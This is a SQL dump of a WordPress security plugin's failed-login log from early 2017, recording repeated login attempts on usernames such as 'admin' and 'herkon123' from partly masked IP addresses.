INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("569","1","herkon123","2017-01-09 13:07:56","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("570","1","herkon123","2017-01-09 13:07:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("571","1","herkon123","2017-01-09 13:22:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("572","1","herkon123","2017-01-09 13:22:59","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("573","1","herkon123","2017-01-09 13:37:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("574","1","herkon123","2017-01-09 13:38:02","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("575","1","herkon123","2017-01-09 13:52:40","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("576","1","herkon123","2017-01-09 13:52:44","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("577","1","herkon123","2017-01-09 14:07:24","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("578","1","herkon123","2017-01-09 14:07:26","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("579","1","herkon123","2017-01-09 14:22:25","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("580","1","herkon123","2017-01-09 14:22:27","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("581","1","herkon123","2017-01-09 14:37:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("582","1","herkon123","2017-01-09 14:37:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("583","1","herkon123","2017-01-09 14:52:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("584","1","herkon123","2017-01-09 14:52:52","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("585","1","herkon123","2017-01-09 15:07:58","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("586","1","herkon123","2017-01-09 15:08:00","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("587","1","herkon123","2017-01-09 15:23:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("588","1","herkon123","2017-01-09 15:23:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("589","1","herkon123","2017-01-09 15:39:04","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("590","1","herkon123","2017-01-09 15:39:06","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("591","1","herkon123","2017-01-09 15:55:14","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("592","1","herkon123","2017-01-09 15:55:18","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("593","1","herkon123","2017-01-09 16:11:35","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("594","1","herkon123","2017-01-09 16:11:36","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("595","1","herkon123","2017-01-09 16:27:48","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("596","1","herkon123","2017-01-09 16:27:50","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("597","1","herkon123","2017-01-09 16:44:31","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("598","1","herkon123","2017-01-09 16:44:32","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("599","1","herkon123","2017-01-09 17:01:11","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("600","1","herkon123","2017-01-09 17:01:16","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("601","1","herkon123","2017-01-09 17:17:37","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("602","1","herkon123","2017-01-09 17:17:39","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("603","1","herkon123","2017-01-09 17:34:28","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("604","1","herkon123","2017-01-09 17:34:30","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("605","1","herkon123","2017-01-09 17:50:49","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("606","1","herkon123","2017-01-09 17:50:51","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("607","1","herkon123","2017-01-09 18:07:19","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("608","1","herkon123","2017-01-09 18:07:23","91.210.147.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("609","1","herkon123","2017-01-09 21:49:15","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("610","1","herkon123","2017-01-09 21:49:23","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("611","0","admin","2017-01-10 03:29:41","5.39.222.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("612","0","admin","2017-01-10 05:41:43","185.130.226.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("613","0","admin","2017-01-10 20:05:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("614","0","admin","2017-01-10 20:05:28","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("615","0","admin","2017-01-10 20:08:13","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("616","0","admin","2017-01-10 20:08:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("617","0","admin","2017-01-10 20:13:29","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("618","0","admin","2017-01-10 20:13:40","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("619","0","admin","2017-01-10 20:16:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("620","0","admin","2017-01-10 20:16:30","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("621","0","admin","2017-01-10 20:19:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("622","0","admin","2017-01-10 20:19:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("623","0","admin","2017-01-10 20:25:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("624","0","admin","2017-01-10 20:28:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("625","0","admin","2017-01-10 20:39:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("626","0","admin","2017-01-10 20:39:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("627","0","admin","2017-01-10 20:43:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("628","0","admin","2017-01-10 20:46:48","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("629","0","admin","2017-01-10 20:46:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("630","0","admin","2017-01-10 20:49:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("631","0","admin","2017-01-10 20:50:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("632","0","admin","2017-01-10 20:53:12","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("633","0","admin","2017-01-10 20:53:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("634","0","admin","2017-01-10 20:56:42","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("635","0","admin","2017-01-10 20:56:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("636","0","admin","2017-01-10 21:04:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("637","0","admin","2017-01-10 21:04:53","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("638","0","admin","2017-01-10 21:11:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("639","0","admin","2017-01-10 21:11:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("640","0","admin","2017-01-10 21:17:29","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("641","0","admin","2017-01-10 21:17:36","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("642","0","admin","2017-01-10 21:23:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("643","0","admin","2017-01-10 21:24:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("644","0","admin","2017-01-10 21:30:20","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("645","0","admin","2017-01-10 21:30:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("646","0","admin","2017-01-10 21:36:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("647","0","admin","2017-01-10 21:36:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("648","0","admin","2017-01-10 21:43:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("649","0","admin","2017-01-10 21:43:10","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("650","0","admin","2017-01-10 21:49:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("651","0","admin","2017-01-10 21:49:36","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("652","0","admin","2017-01-10 21:55:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("653","0","admin","2017-01-10 21:55:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("654","0","admin","2017-01-10 22:02:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("655","0","admin","2017-01-10 22:02:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("656","0","admin","2017-01-10 22:08:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("657","0","admin","2017-01-10 22:08:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("658","0","admin","2017-01-10 22:14:31","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("659","0","admin","2017-01-10 22:14:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("660","0","admin","2017-01-10 22:20:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("661","0","admin","2017-01-10 22:20:42","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("662","0","admin","2017-01-10 22:26:36","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("663","0","admin","2017-01-10 22:26:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("664","0","admin","2017-01-10 22:32:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("665","0","admin","2017-01-10 22:32:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("666","0","admin","2017-01-10 22:38:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("667","0","admin","2017-01-10 22:38:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("668","0","admin","2017-01-10 22:44:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("669","0","admin","2017-01-10 22:44:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("670","0","admin","2017-01-10 22:50:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("671","0","admin","2017-01-10 22:50:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("672","0","admin","2017-01-10 22:56:31","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("673","0","admin","2017-01-10 22:56:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("674","0","admin","2017-01-10 23:02:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("675","0","admin","2017-01-10 23:02:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("676","0","admin","2017-01-10 23:08:42","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("677","0","admin","2017-01-10 23:08:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("678","0","admin","2017-01-10 23:14:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("679","0","admin","2017-01-10 23:14:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("680","0","admin","2017-01-10 23:20:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("681","0","admin","2017-01-10 23:20:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("682","0","admin","2017-01-10 23:26:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("683","0","admin","2017-01-10 23:26:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("684","0","admin","2017-01-10 23:32:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("685","0","admin","2017-01-10 23:32:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("686","0","admin","2017-01-10 23:38:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("687","0","admin","2017-01-10 23:38:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("688","0","admin","2017-01-10 23:44:26","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("689","0","admin","2017-01-10 23:44:30","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("690","0","admin","2017-01-10 23:50:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("691","0","admin","2017-01-10 23:50:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("692","0","admin","2017-01-10 23:55:43","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("693","0","admin","2017-01-10 23:55:47","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("694","0","admin","2017-01-11 00:01:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("695","0","admin","2017-01-11 00:01:27","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("696","0","admin","2017-01-11 00:07:13","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("697","0","admin","2017-01-11 00:07:16","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("698","0","admin","2017-01-11 00:12:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("699","0","admin","2017-01-11 00:12:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("700","0","admin","2017-01-11 00:18:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("701","0","admin","2017-01-11 00:18:10","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("702","0","admin","2017-01-11 00:23:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("703","0","admin","2017-01-11 00:23:27","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("704","0","admin","2017-01-11 00:28:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("705","0","admin","2017-01-11 00:28:47","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("706","0","admin","2017-01-11 00:34:13","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("707","0","admin","2017-01-11 00:34:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("708","0","admin","2017-01-11 00:39:29","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("709","0","admin","2017-01-11 00:39:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("710","0","admin","2017-01-11 00:45:01","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("711","0","admin","2017-01-11 00:45:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("712","0","admin","2017-01-11 00:50:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("713","0","admin","2017-01-11 00:50:18","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("714","0","admin","2017-01-11 00:55:40","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("715","0","admin","2017-01-11 00:55:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("716","0","admin","2017-01-11 01:01:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("717","0","admin","2017-01-11 01:01:05","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("718","0","admin","2017-01-11 01:06:29","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("719","0","admin","2017-01-11 01:06:31","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("720","0","admin","2017-01-11 01:11:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("721","0","admin","2017-01-11 01:11:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("722","0","admin","2017-01-11 01:16:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("723","0","admin","2017-01-11 01:16:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("724","0","admin","2017-01-11 01:22:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("725","0","admin","2017-01-11 01:22:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("726","0","admin","2017-01-11 01:27:18","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("727","0","admin","2017-01-11 01:27:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("728","0","admin","2017-01-11 01:32:30","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("729","0","admin","2017-01-11 01:32:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("730","0","admin","2017-01-11 01:37:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("731","0","admin","2017-01-11 01:37:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("732","0","admin","2017-01-11 01:42:47","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("733","0","admin","2017-01-11 01:42:52","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("734","0","admin","2017-01-11 01:43:50","5.39.222.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("735","0","admin","2017-01-11 01:47:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("736","0","admin","2017-01-11 01:48:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("737","0","admin","2017-01-11 01:52:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("738","0","admin","2017-01-11 01:52:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("739","0","admin","2017-01-11 01:57:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("740","0","admin","2017-01-11 01:58:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("741","0","admin","2017-01-11 02:02:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("742","0","admin","2017-01-11 02:03:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("743","0","admin","2017-01-11 02:08:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("744","0","admin","2017-01-11 02:08:09","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("745","0","admin","2017-01-11 02:13:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("746","0","admin","2017-01-11 02:13:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("747","0","admin","2017-01-11 02:18:36","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("748","0","admin","2017-01-11 02:18:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("749","0","admin","2017-01-11 02:23:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("750","0","admin","2017-01-11 02:23:48","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("751","0","admin","2017-01-11 02:29:09","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("752","0","admin","2017-01-11 02:29:12","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("753","0","admin","2017-01-11 02:34:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("754","0","admin","2017-01-11 02:34:26","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("755","0","admin","2017-01-11 02:39:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("756","0","admin","2017-01-11 02:39:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("757","0","admin","2017-01-11 02:45:00","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("758","0","admin","2017-01-11 02:45:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("759","0","admin","2017-01-11 02:50:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("760","0","admin","2017-01-11 02:50:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("761","0","admin","2017-01-11 02:55:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("762","0","admin","2017-01-11 02:55:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("763","0","admin","2017-01-11 03:00:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("764","0","admin","2017-01-11 03:00:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("765","0","admin","2017-01-11 03:06:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("766","0","admin","2017-01-11 03:06:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("767","0","admin","2017-01-11 03:11:09","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("768","0","admin","2017-01-11 03:11:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("769","0","admin","2017-01-11 03:16:18","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("770","0","admin","2017-01-11 03:16:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("771","0","admin","2017-01-11 03:21:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("772","0","admin","2017-01-11 03:21:26","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("773","0","admin","2017-01-11 03:26:28","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("774","0","admin","2017-01-11 03:26:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("775","0","admin","2017-01-11 03:31:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("776","0","admin","2017-01-11 03:31:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("777","0","admin","2017-01-11 03:37:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("778","0","admin","2017-01-11 03:37:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("779","0","admin","2017-01-11 03:42:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("780","0","admin","2017-01-11 03:42:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("781","1","herkon123","2017-01-11 09:25:22","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("782","1","herkon123","2017-01-11 09:25:25","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("783","1","herkon123","2017-01-11 10:53:58","185.29.140.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("784","1","herkon123","2017-01-12 08:19:15","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("785","1","herkon123","2017-01-12 08:19:19","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("786","0","bey","2017-01-12 18:04:50","185.85.239.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("787","0","epostan","2017-01-12 20:08:06","185.86.13.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("788","0","giri","2017-01-12 20:40:37","5.39.218.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("789","1","herkon123","2017-01-13 02:13:46","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("790","1","herkon123","2017-01-13 02:13:47","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("791","1","herkon123","2017-01-13 20:03:28","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("792","1","herkon123","2017-01-13 20:03:33","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("793","1","herkon123","2017-01-14 14:14:16","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("794","1","herkon123","2017-01-14 14:14:20","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("795","1","herkon123","2017-01-15 08:42:53","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("796","1","herkon123","2017-01-15 08:43:04","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("797","1","herkon123","2017-01-15 15:09:19","109.161.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("798","1","herkon123","2017-01-17 03:06:14","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("799","1","herkon123","2017-01-17 03:06:19","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("800","1","herkon123","2017-01-17 10:05:31","186.226.238.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("801","0","admin","2017-01-17 16:06:18","185.86.13.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("802","0","admin","2017-01-19 13:56:38","5.39.222.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("803","0","admin","2017-01-19 17:50:52","185.86.5.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("804","1","herkon123","2017-01-29 04:34:57","177.38.236.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("805","0","zhetiye","2017-01-30 05:01:35","185.86.13.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("806","1","herkon123","2017-01-31 16:55:43","61.91.39.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("807","0","copyright","2017-02-01 09:20:47","185.86.13.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("808","0","admin","2017-02-01 12:52:37","185.130.226.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("809","1","herkon123","2017-02-03 22:58:50","190.129.25.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("810","1","herkon123","2017-02-06 00:28:08","190.90.43.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("811","1","herkon123","2017-02-07 17:48:05","77.69.251.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("812","0","admin","2017-02-08 14:35:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("813","0","admin","2017-02-08 14:36:02","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("814","0","admin","2017-02-08 14:40:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("815","0","admin","2017-02-08 14:45:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("816","0","admin","2017-02-08 14:46:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("817","0","admin","2017-02-08 14:50:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("818","0","admin","2017-02-08 14:50:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("819","0","admin","2017-02-08 14:56:05","91.210.144.*");
